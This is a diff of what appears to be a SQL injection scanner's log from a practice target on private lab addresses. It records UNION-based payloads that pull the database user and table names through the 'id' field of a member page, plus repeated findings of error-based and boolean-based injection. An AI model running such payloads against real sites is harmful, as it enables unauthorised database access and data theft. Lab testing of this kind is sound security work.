@@ -1,4 +1,4 @@
-[+] http://192.168.56.3/?page=member - Error-Based SQLi vulnerability found
+[+] http://192.168.247.128/?page=member - Error-Based SQLi vulnerability found
 Payload: 1 UNION ALL SELECT USER(),NULL
 Vulnerable field: id
 User: ID: 1 UNION ALL SELECT USER(),NULL  First name: one Surname : me
@@ -36,4 +36,7 @@ Payload: 1 UNION ALL SELECT table_name, NULL from information_schema.tables wher
 Vulnerable field: id
 Database: ID: 1 UNION ALL SELECT table_name, NULL from information_schema.tables where table_schema=database()  First name: one Surname : me
 Database: ID: 1 UNION ALL SELECT table_name, NULL from information_schema.tables where table_schema=database()  First name: users Surname :
-[+] http://192.168.56.3/?page=member - Error-Based SQLi vulnerability found
+[+] http://192.168.247.128/?page=member - Boolean-based SQLi vulnerability found
+[+] http://192.168.247.128/?page=member - Boolean-based SQLi vulnerability found
+[+] http://192.168.247.128/?page=member - Boolean-based SQLi vulnerability found
+[+] http://192.168.247.128/?page=member - Boolean-based SQLi vulnerability found
